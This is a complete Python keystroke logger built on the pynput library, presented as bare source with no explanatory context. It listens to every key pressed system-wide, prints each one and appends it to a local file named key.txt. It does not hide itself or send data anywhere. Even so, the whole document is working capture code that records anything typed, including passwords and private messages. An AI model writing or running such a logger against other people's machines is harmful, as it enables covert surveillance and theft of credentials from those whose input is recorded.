from pynput import keyboard

def key_listener():
    # Start listening for pressed keys
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

def log_key(key):
    try:
        # Check if the key is a regular character
        if isinstance(key, keyboard.KeyCode):
            key_data = key.char
            if key_data is None:
                key_data = ' [None] '  # Handle None character case
        else:
            # For special keys
            key_data = f' [{key}] '
    except AttributeError as e:
        # Handle possible AttributeError
        key_data = f' [{key}] '
        print(f"Error: {e}")

    # Print the key in the console
    print(f"Key pressed: {key_data}")

    # Append the pressed key information to the file
    try:
        with open("key.txt", "a", encoding="utf-8") as file:
            file.write(key_data + '\n')
    except Exception as e:
        # Handle possible errors while writing to the file
        print(f"File write error: {e}")

# Start listening for keys
key_listener()
